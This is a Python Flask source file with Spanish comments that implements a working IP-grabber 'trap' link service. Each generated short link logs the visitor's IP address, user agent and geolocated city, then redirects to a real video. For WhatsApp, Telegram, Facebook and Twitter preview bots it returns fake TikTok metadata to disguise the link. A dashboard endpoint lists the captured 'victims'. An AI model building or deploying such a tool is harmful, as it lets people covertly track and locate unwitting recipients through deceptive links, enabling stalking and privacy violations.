import os
import random
import string
import requests  # Nueva librería para geolocalización
from flask import Flask, request, jsonify, redirect, render_template
from datetime import datetime, timedelta
import psycopg2 

app = Flask(__name__)

DATABASE_URL = os.environ.get("DATABASE_URL")

def get_db_connection():
    if not DATABASE_URL: return None
    conn = psycopg2.connect(DATABASE_URL)
    return conn

def inicializar_db():
    try:
        conn = get_db_connection()
        if conn is None: return
        cur = conn.cursor()
        
        # Tablas (igual que antes)
        cur.execute("""
            CREATE TABLE IF NOT EXISTS trampas (
                id SERIAL PRIMARY KEY,
                token VARCHAR(50) UNIQUE NOT NULL,
                nombre VARCHAR(100),
                created_at TIMESTAMP DEFAULT NOW()
            );
        """)
        
        # Tabla Intrusos (Aseguramos que exista la columna city)
        cur.execute("""
            CREATE TABLE IF NOT EXISTS intrusos (
                id SERIAL PRIMARY KEY,
                trampa_id INTEGER REFERENCES trampas(id),
                ip_address VARCHAR(45),
                user_agent TEXT,
                city VARCHAR(100),
                captured_at TIMESTAMP DEFAULT NOW()
            );
        """)
        conn.commit()
        cur.close()
        conn.close()
    except Exception as e:
        print(f"Error DB: {e}")

def generar_token():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=6))

# --- FUNCIÓN DE RASTREO GEO ---
def obtener_ubicacion(ip):
    try:
        # Consultamos la API de geolocalización
        response = requests.get(f"http://ip-api.com/json/{ip}")
        data = response.json()
        if data['status'] == 'success':
            return f"{data['city']}, {data['country']}"
        else:
            return "Ubicación Desconocida"
    except:
        return "Error de Rastreo"

# --- RUTA DE LA APP MÓVIL (DASHBOARD) ---
@app.route('/')
def home():
    # Esto busca el archivo index.html en la carpeta templates
    return render_template('index.html')

# --- RUTA MODIFICADA: AHORA RECIBE EL LINK REAL ---
@app.route('/api/crear_trampa', methods=['POST'])
def crear_trampa():
    data = request.json
    nombre = data.get('nombre', 'Trampa TikTok')
    # Aquí recibimos el link real del video
    url_destino = data.get('url_destino', 'https://www.google.com') 
    
    token = generar_token()
    
    conn = get_db_connection()
    cur = conn.cursor()
    # Guardamos el link real en la base de datos
    cur.execute(
        "INSERT INTO trampas (token, nombre, url_destino) VALUES (%s, %s, %s)", 
        (token, nombre, url_destino)
    )
    conn.commit()
    cur.close()
    conn.close()
    
    return jsonify({"status": "ok", "link": f"{request.host_url}s/{token}"})

# --- RUTA MODIFICADA: REDIRECCIÓN INTELIGENTE ---
@app.route('/s/<token>')
def trampa_activada(token):
    # 1. CAPTURA FORENSE (Igual que antes)
    ip_victima = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ip_victima and ',' in ip_victima: ip_victima = ip_victima.split(',')[0].strip()
    user_agent = request.headers.get('User-Agent')
    ubicacion = obtener_ubicacion(ip_victima)
    
    conn = get_db_connection()
    cur = conn.cursor()
    
    # Buscamos la trampa Y el link de destino
    cur.execute("SELECT id, url_destino FROM trampas WHERE token = %s", (token,))
    trampa = cur.fetchone()
    
    url_final = "https://www.tiktok.com" # Destino por defecto si algo falla
    
    if trampa:
        trampa_id = trampa[0]
        url_final = trampa[1] # Recuperamos el link original que guardaste
        
        # Guardamos al intruso
        print(f"⚠️ INTRUSO: {ip_victima} -> Redirigiendo a {url_final}")
        cur.execute(
            "INSERT INTO intrusos (trampa_id, ip_address, user_agent, city) VALUES (%s, %s, %s, %s)",
            (trampa_id, ip_victima, user_agent, ubicacion)
        )
        conn.commit()
    
    cur.close()
    conn.close()

    # 2. EL DISFRAZ DE TIKTOK (Para WhatsApp/Telegram)
    # Si es un bot de previsualización, le mostramos metadatos de TikTok
    user_agent_str = str(user_agent).lower()
    if "facebook" in user_agent_str or "whatsapp" in user_agent_str or "telegram" in user_agent_str or "twitter" in user_agent_str:
        return f"""
        <html>
        <head>
            <meta property="og:site_name" content="TikTok">
            <meta property="og:title" content="TikTok - Video Viral">
            <meta property="og:image" content="https://sf16-scmcdn-va.ibytedtos.com/goofy/tiktok/web/node/_next/static/images/logo-dark-e95c4d0840c83a04.png">
            <meta property="og:description" content="Mira este video.">
            <meta property="og:type" content="video.other">
        </head>
        <body></body>
        </html>
        """

    # 3. LA REDIRECCIÓN FINAL (La víctima va al video real)
    return redirect(url_final)

@app.route('/api/ver_ataques', methods=['GET'])
def ver_ataques():
    conn = get_db_connection()
    cur = conn.cursor()
    # Ahora pedimos también la columna 'city'
    query = """
        SELECT t.nombre, i.ip_address, i.captured_at, i.user_agent, i.city 
        FROM intrusos i
        JOIN trampas t ON i.trampa_id = t.id
        ORDER BY i.captured_at DESC LIMIT 20
    """
    cur.execute(query)
    ataques = cur.fetchall()
    cur.close()
    conn.close()
    
    resultado = []
    for a in ataques:
        # CORRECCIÓN HORARIA: Restamos 5 horas para Ecuador
        hora_utc = a[2]
        hora_ecuador = hora_utc - timedelta(hours=5)
        
        resultado.append({
            "trampa": a[0],
            "ip": a[1],
            "hora": hora_ecuador.strftime("%Y-%m-%d %H:%M:%S"), # Hora corregida
            "dispositivo": a[3],
            "ubicacion": a[4] if a[4] else "Desconocida" # Nueva data
        })
        
    return jsonify(resultado)

inicializar_db()

# --- HERRAMIENTA DE ACTUALIZACIÓN DE DB ---
@app.route('/update_db_schema')
def update_db_schema():
    try:
        conn = get_db_connection()
        cur = conn.cursor()
        # Comando SQL para agregar la columna si no existe
        cur.execute("ALTER TABLE trampas ADD COLUMN IF NOT EXISTS url_destino TEXT;")
        conn.commit()
        cur.close()
        conn.close()
        return "✅ Base de datos actualizada: Columna 'url_destino' agregada."
    except Exception as e:
        return f"❌ Error: {e}"

if __name__ == '__main__':
    app.run(debug=True, port=5000)